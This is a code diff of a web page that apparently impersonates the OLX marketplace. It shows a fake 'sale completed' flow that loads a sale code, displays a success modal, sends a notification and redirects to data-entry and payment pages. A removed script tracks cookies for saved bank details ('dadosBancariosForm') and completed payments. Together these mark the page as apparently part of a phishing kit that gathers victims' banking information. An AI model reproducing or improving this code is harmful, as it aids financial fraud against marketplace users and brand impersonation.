@@ -9,41 +9,6 @@
     <link rel="stylesheet" href="/css/style.css">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
     <link rel="shortcut icon" href="/images/olx-favicon.ico" type="image/x-icon">
-   
-   <script>
-
-     (function () {
-            if (document.cookie.indexOf("pagamentoFeito=true") !== -1) {
-                if (!window.location.pathname.endsWith('/pag/aprovado.html')) {
-                    window.location.href = '/pag/aprovado.html';
-                }
-            }
-        })();
-        
-        // Redireciona para pagamento se já tiver dados bancários salvos
-        (function () {
-            function getCookie(name) {
-                const nameEQ = name + "=";
-                const ca = document.cookie.split(";");
-                for (let i = 0; i < ca.length; i++) {
-                    let c = ca[i];
-                    while (c.charAt(0) === " ") c = c.substring(1, c.length);
-                    if (c.indexOf(nameEQ) === 0) return decodeURIComponent(c.substring(nameEQ.length, c.length));
-                }
-                return null;
-            }
-            if (getCookie("dadosBancariosForm")) {
-                // Tenta pegar o parâmetro id da URL
-                const params = new URLSearchParams(window.location.search);
-                const id = params.get("id");
-                if (id) {
-                    window.location.href = "/pag/pagamento.html?id=" + encodeURIComponent(id);
-                } else {
-                    window.location.href = "/pag/pagamento.html";
-                }
-            }
-        })();
-    </script>
 </head>
 
 <body>
@@ -289,7 +254,7 @@
         function carregarDadosProduto() {
             // Obter código da venda da URL
             const urlParams = new URLSearchParams(window.location.search);
-            const codigoVenda = urlParams.get('codigo') || urlParams.get('id') || 'OLX123456789';
+            const codigoVenda = urlParams.get('codigo') || 'OLX123456789';
 
             // Tentar vários caminhos para o arquivo JSON
             const caminhos = [
@@ -303,8 +268,7 @@
             function tentarProximoCaminho() {
                 if (tentativaAtual >= caminhos.length) {
                     console.error('Não foi possível carregar os dados do produto');
-                    const erroContainer = document.getElementById('erro-container');
-                    if (erroContainer) erroContainer.classList.remove('hidden');
+                    document.getElementById('erro-container').classList.remove('hidden');
                     return;
                 }
 
@@ -321,8 +285,7 @@
                             preencherDadosVenda(venda);
                             // Mostrar modal de sucesso após carregar dados
                             setTimeout(() => {
-                                const modal = document.getElementById('sucesso-modal');
-                                if (modal) modal.classList.remove('hidden');
+                                document.getElementById('sucesso-modal').classList.remove('hidden');
                             }, 1500);
                         } else {
                             throw new Error('Venda não encontrada');
@@ -336,26 +299,6 @@
             }
 
             tentarProximoCaminho();
-        }
-
-        // Função para preencher os dados na tela (adicione checagem de elementos)
-        function preencherDadosVenda(venda) {
-            if (!venda) return;
-            const imgPrincipal = document.getElementById('produto-imagem-principal');
-            if (imgPrincipal && venda.imagem) imgPrincipal.src = venda.imagem;
-            const nome = document.getElementById('produto-nome');
-            if (nome) nome.textContent = venda.titulo || '';
-            const valor = document.getElementById('produto-valor');
-            if (valor) valor.textContent = venda.valor || '';
-            const data = document.getElementById('produto-data');
-            if (data) data.textContent = venda.data || '';
-            const codigo = document.getElementById('venda-codigo');
-            if (codigo) codigo.textContent = venda.codigo || '';
-            const codigoSmall = document.getElementById('venda-codigo-small');
-            if (codigoSmall) codigoSmall.textContent = venda.codigo || '';
-            const plataforma = document.getElementById('venda-plataforma');
-            if (plataforma) plataforma.textContent = venda.plataforma || '';
-            // ...adicione outros campos conforme necessário...
         }
 
         // Função melhorada para manipular miniaturas com suporte a touch
@@ -1053,7 +996,7 @@
                 })
             })
                 .then(response => response.json())
-                .then ((data) => {
+                .then(data => {
                     console.log('Notificação enviada:', data);
                     // Modificado: Incluir o código da venda na URL de redirecionamento
                     window.location.href = `/pag/dados.html?id=${encodeURIComponent(codigoVenda)}`;
